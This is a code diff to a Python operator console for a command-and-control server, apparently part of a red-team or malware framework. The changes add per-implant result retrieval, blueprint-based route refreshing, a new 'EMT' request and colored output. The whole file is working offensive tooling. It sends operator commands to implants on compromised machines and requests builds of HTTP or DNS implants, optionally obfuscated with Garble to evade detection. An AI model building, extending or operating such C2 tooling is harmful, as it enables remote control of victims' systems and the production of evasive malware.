@@ -2,6 +2,7 @@ import gc
 import socket
 import getpass
 import ssl
+from termcolor import colored, cprint
 
 
 def authenticate_user(uname_retr: str, pw_retr: str) -> str:
@@ -34,7 +35,8 @@ def authenticate_user(uname_retr: str, pw_retr: str) -> str:
         print(f"error: {e}")
 
 
-def unified_send(rtype, operator_name, session_token, imp_id = None, command = None, comp_proto = None, is_garbled = None):
+def unified_send(rtype, operator_name, session_token, imp_id = None, command = None,
+                 comp_proto = None, is_garbled = None, bp_name = None):
     """
     Unified send function to send and receive info from the C2
     :param rtype: PUB, RTR, BLD, RFR
@@ -44,6 +46,7 @@ def unified_send(rtype, operator_name, session_token, imp_id = None, command = N
     :param command: optional: If sending a command then the command
     :param comp_proto: optional: If compiling an implant, the protocol to use
     :param is_garbled: optional: If compiling, whether or not to use garble to compile
+    :param bp_name: The name of the Blueprint
     :return: server response
     """
     # Create the socket
@@ -62,11 +65,13 @@ def unified_send(rtype, operator_name, session_token, imp_id = None, command = N
         case "PUB":
             publish_request = f"PUB {operator_name} {session_token} {imp_id} {command}"
         case "RTR":
-            publish_request = f"RTR {operator_name} {session_token}"
+            publish_request = f"RTR {operator_name} {session_token} {imp_id}"
         case "BLD":
             publish_request = f"BLD {operator_name} {session_token} {comp_proto} {is_garbled}"
         case "RFR":
-            publish_request = f"RFR {operator_name} {session_token}"
+            publish_request = f"RFR {operator_name} {session_token} {bp_name}"
+        case "EMT":
+            publish_request = f"EMT {operator_name} {session_token}"
 
     secure_client_socket.send(publish_request.encode())
 
@@ -74,7 +79,7 @@ def unified_send(rtype, operator_name, session_token, imp_id = None, command = N
         response = secure_client_socket.recv(4096).decode()
         if not response:
             break
-        print(f"Server response: {response}")
+        cprint(f"Server response: {response}", "blue")
     # secure_client_socket.close()
 
 
@@ -87,6 +92,7 @@ if __name__ == "__main__":
     # Garbage collect
     gc.collect()
     while True:
+        unified_send("EMT", uname, session_token)
         choice = input("1: Interact or\n"
                        "2: Retrieve results or\n"
                        "3: Build an implant or \n"
@@ -98,7 +104,8 @@ if __name__ == "__main__":
                 command = input("Enter command to send: ")
                 unified_send("PUB", uname, session_token, implant_id, command)
             case "2":
-                unified_send("RTR", uname, session_token)
+                implant_id = input("Enter implant ID: ")
+                unified_send("RTR", uname, session_token, implant_id)
             case "3":
                 build_choice = input("HTTP or DNS > ")
                 if build_choice.lower() != "http" and build_choice.lower() != "dns":
@@ -107,9 +114,10 @@ if __name__ == "__main__":
                 garbled = input("Compile with Garbler (y/n) > ").strip().lower()
                 if garbled != "y" and garbled != "n":
                     garbled = input("Need y/n > ")
-                unified_send("BLD", uname, session_token, " ", " ", "http", garbled)
+                unified_send("BLD", uname, session_token, comp_proto="http", is_garbled=garbled)
             case "4":
+                bp_name = input("Enter the name of the new Blueprint > ")
                 print("Refreshing routes")
-                unified_send("RFR", uname, session_token)
+                unified_send("RFR", uname, session_token, bp_name=bp_name)
             case _:
                 print("Unexpected command \n")
